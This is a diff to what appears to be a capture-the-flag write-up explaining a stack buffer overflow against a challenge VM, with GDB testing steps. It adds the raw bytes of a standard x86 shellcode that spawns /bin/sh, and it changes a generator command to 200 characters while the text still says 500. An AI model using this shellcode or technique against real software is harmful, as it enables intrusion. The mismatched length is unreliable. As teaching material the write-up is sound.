@@ -6,7 +6,9 @@ Run `./hack_terminal` to open a fake terminal of the VM. Then, type `cd ; for i 
 
 
 ## Explanations
-The vulnerability used is a buffer overflow. When the VM asks for a name, the user simply gives it a too long name to the point where the return address at the end of function `parse` is overwritten. This return address is then modified to point toward the beginning of the buffer (that stores the user's input) and execute malicious instructions in it. Here, the malicious instructions are launching a shell and modify all HTML file as done in the Mu challenge.
+The vulnerability used is a buffer overflow. When the VM asks for a name, the user simply gives it a too long name to the point where the return address at the end of function `parse` is overwritten. This return address is then modified to point toward the beginning of the buffer (that stores the user's input) and execute malicious instructions in it. Here, the malicious instructions are launching a shell and modify all HTML files as done in the Mu challenge.
+
+The shellcode used is `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`. The rest of the memory is filled by the no-operation instruction `\x90` to reach the return address.
 
 ## GDB Tests
 
@@ -14,7 +16,7 @@ The vulnerability used is a buffer overflow. When the VM asks for a name, the us
 
 Let's use GDB (a debugger tool) to better understand what's happening in the stack memory. We'll be using the c program _test_gdb.c_ which is a simplified version of the source code of the application. Once it is compiled with the command `gcc -m32 -fno-stack-protector -z execstack test_gdb.c -o test_gdb`, we can run gdb using `gdb test_gdb`.
 
-First of all, let's try to run the program and feed it a too long name with the command `r < attack.txt` (_attack.txt_ contains a 500-long string of letters 'A' and can be generated with Python `python3 -c 'print("A"*500)' > attack.txt`). Gdb replies a segmentation fault :
+First of all, let's try to run the program and feed it a too long name with the command `r < attack.txt` (_attack.txt_ contains a 500-long string of letters 'A' and can be generated with Python `python3 -c 'print("A"*200)' > attack.txt`). Gdb replies a segmentation fault :
 ```
 Stopped reason: SIGSEGV
 0x41414141 in ?? ()
